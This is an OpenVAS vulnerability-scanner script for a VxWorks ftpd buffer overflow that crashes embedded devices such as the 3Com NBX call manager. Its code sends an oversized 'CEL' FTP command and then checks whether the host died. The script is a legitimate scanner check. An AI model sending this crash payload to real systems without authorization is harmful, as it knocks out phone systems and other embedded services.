# OpenVAS Vulnerability Test
# $Id: vxworks_ftpdDOS.nasl 8144 2017-12-15 13:19:55Z cfischer $
# Description: vxworks ftpd buffer overflow Denial of Service
#
# Authors:
# Michael Scheidell at SECNAP
# derived from aix_ftpd, original script
# written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Copyright:
# Copyright (C) 2002 Michael Scheidell
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to make the remote host
crash by issuing this FTP command :

	CEL aaaa(...)aaaa
	
This problem is similar to the 'aix ftpd' overflow
but on embedded vxworks based systems like the 3com
nbx IP phone call manager and seems to cause the server
to crash.";

tag_solution = "If you are using an embedded vxworks
product, please contact the OEM vendor and reference
WindRiver field patch TSR 296292. If this is the 
3com NBX IP Phone call manager, contact 3com.

This affects VxWorks ftpd versions 5.4 and 5.4.2

For more information, see CERT VU 317417
http://www.kb.cert.org/vuls/id/317417
or full security alert at
http://www.secnap.net/security/nbx001.html";


# References:
# From: "Michael S. Scheidell" <Scheidell@secnap.com>
# Subject: [VU#317417] Denial of Service condition in vxworks ftpd/3com nbx
# To: "BugTraq" <bugtraq@securityfocus.com>, <security@windriver.com>,
#    <support@windriver.com>
# Date: Mon, 2 Dec 2002 13:04:31 -0500

if(description)
{
 script_id(11184);
 script_version("$Revision: 8144 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-15 14:19:55 +0100 (Fri, 15 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2002-2300");
 script_bugtraq_id(6297, 7480);
 
 name = "vxworks ftpd buffer overflow Denial of Service";
 
 script_name(name);
	     
		 
 script_category(ACT_KILL_HOST);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Denial of Service");

 
 script_copyright("This script is Copyright (C) 2002 Michael Scheidell");
		  
 script_dependencies("find_service.nasl",
	"ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 script_require_keys("ftp/vxftpd");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here : 
#

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(soc)
{
  buf = ftp_recv_line(socket:soc);
  if(!buf){
 	close(soc);
	exit(0);
	}
  start_denial();
  
  buf = string("CEL a\r\n");
  send(socket:soc, data:buf);
  r = recv_line(socket:soc, length:1024);
  if(!r)exit(0);
  
  buf = string("CEL ", crap(2048), "\r\n");
  send(socket:soc, data:buf);
  b = recv_line(socket:soc, length:1024);
  ftp_close(socket: soc);
  alive = end_denial();
  if(!b)security_message(port);
  if(!alive)set_kb_item( name:"Host/dead", value:TRUE );
}
